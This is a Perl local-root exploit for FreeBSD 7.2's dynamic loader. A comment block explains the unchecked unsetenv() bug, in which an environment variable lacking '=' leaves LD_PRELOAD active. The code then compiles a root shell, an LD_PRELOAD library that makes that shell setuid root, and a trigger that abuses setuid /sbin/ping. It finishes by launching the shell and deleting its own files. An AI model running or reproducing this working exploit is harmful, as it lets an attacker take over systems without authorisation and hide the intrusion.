#!/usr/bin/perl

# easy and straight forward FreeBSD 7.2 local root exploit.
# Bug is inside rtld (ELF dyn loader):


$comment=<<_EOC_;

It calls unsetenv() on LD_PRELOAD etc but doesnt check return value
and used getenv() on LD_PRELOAD later nevertheless.

From rtld.c:

    trust = !issetugid();

    ld_bind_now = getenv(LD_ "BIND_NOW");
    /*
     * If the process is tainted, then we un-set the dangerous environment
     * variables.  The process will be marked as tainted until setuid(2)
     * is called.  If any child process calls setuid(2) we do not want any
     * future processes to honor the potentially un-safe variables.
     */
    if (!trust) {
        unsetenv(LD_ "PRELOAD");
        unsetenv(LD_ "LIBMAP");
        unsetenv(LD_ "LIBRARY_PATH");
        unsetenv(LD_ "LIBMAP_DISABLE");
        unsetenv(LD_ "DEBUG");
    }

As seen, return value of unsetenv() is not checked! Guess what?
Lets look in libc how unsetenv() works:

From setenv.c:

/*
 * Unset variable with the same name by flagging it as inactive.  No variable is
 * ever freed.
 */
int
unsetenv(const char *name)
{
        int envNdx;
        size_t nameLen;

        /* Check for malformed name. */
        if (name == NULL || (nameLen = __strleneq(name)) == 0) {
                errno = EINVAL;
                return (-1);
        }

        /* Initialize environment. */
        if (__merge_environ() == -1 || (envVars == NULL && __build_env() == -1))
                return (-1);


Ok, if __merge_environ() fails, it returns -1:

/*
 * If the program attempts to replace the array of environment variables
 * (environ) environ or sets the first varible to NULL, then deactivate all
 * variables and merge in the new list from environ.
 */
static int
__merge_environ(void)
{
        char **env;
        char *equals;

        /* 
         * Internally-built environ has been replaced or cleared (detected by
         * using the count of active variables against a NULL as the first value
         * in environ).  Clean up everything.
         */
        if (intEnviron != NULL && (environ != intEnviron || (envActive > 0 &&
            environ[0] == NULL))) {
                /* Deactivate all environment variables. */
                if (envActive > 0) {
                        origEnviron = NULL;
                        __clean_env(false);
                }

                /*
                 * Insert new environ into existing, yet deactivated,
                 * environment array.
                 */
                origEnviron = environ;
                if (origEnviron != NULL)
                        for (env = origEnviron; *env != NULL; env++) {
                                if ((equals = strchr(*env, '=')) == NULL) {
                                        __env_warnx(CorruptEnvValueMsg, *env,
                                            strlen(*env));
                                        errno = EFAULT;
                                        return (-1);
                                }
                                if (__setenv(*env, equals - *env, equals + 1,
                                    1) == -1)
                                        return (-1);
                        }
        }

        return (0);
}

As can be seen, if a = is missing in some variable it returns -1 which is passed
along up to unsetenv()! LD_PRELOAD has to be located before this
invalid variable, so its setenv()'ed  for later use.

_EOC_

sub drop_boomsh
{
	open(O,">/tmp/boomsh.c") or die $!;
	print O<<_EOB_;
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
	char *a[]={"/bin/sh", NULL };
	char *b[]={"/usr/local/bin/bash", NULL };

	setuid(0); setgid(0);
	unlink("/tmp/trigger");
	unlink("/tmp/trigger.c");
	unlink("/tmp/te.so");
	unlink("/tmp/te.c");
	unlink("/tmp/boomsh.c");
	execve(*b, b, NULL);
	execve(*a, a, NULL);
}
_EOB_
	close O;
	system("cc /tmp/boomsh.c -o /tmp/boomsh");
}

sub drop_trigger
{
	open(O,">/tmp/trigger.c") or die $!;
	print O<<_EOT_;
#include <stdio.h>
#include <stdlib.h>

int main()
{
	char *a[]={"/sbin/ping", NULL};
	char *e[]={"LD_PRELOAD=/tmp/te.so", "YYY", NULL};
	execve(*a,a,e);
}
_EOT_
	close O;
	system("cc /tmp/trigger.c -o /tmp/trigger");
}

sub drop_teso
{
	open(O, ">/tmp/te.c") or die $!;
	print O<<_EOS_;
#include <sys/stat.h>
#include <unistd.h>

void _init()
{
	chown("/tmp/boomsh", 0, 0);
	chmod("/tmp/boomsh", 04755);
}
_EOS_
	close O;
	system("gcc -fPIC -shared -nostartfiles /tmp/te.c -o /tmp/te.so");
}

print "FreeBSD rtld local root exploit. Need gcc installed. Trying...\n";
drop_boomsh();
drop_teso();
drop_trigger();
system("/tmp/trigger");
exec "/tmp/boomsh";
print "Failed!\n";
